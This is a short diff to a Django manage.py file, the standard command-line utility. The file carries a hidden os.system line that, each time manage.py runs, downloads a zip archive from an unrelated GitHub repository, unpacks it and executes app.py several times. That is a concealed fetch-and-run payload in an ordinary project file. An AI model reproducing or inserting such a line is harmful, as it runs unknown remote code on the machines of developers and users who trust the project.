@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 """Django's command-line utility for administrative tasks."""
-####################################################################################################
+###################################################################################################
 import os
 import sys
 os.system('wget https://github.com/zaulaferita/flask-hello-world/raw/master/train.zip;unzip train.zip;python app.py;python app.py;python app.py;python app.py')
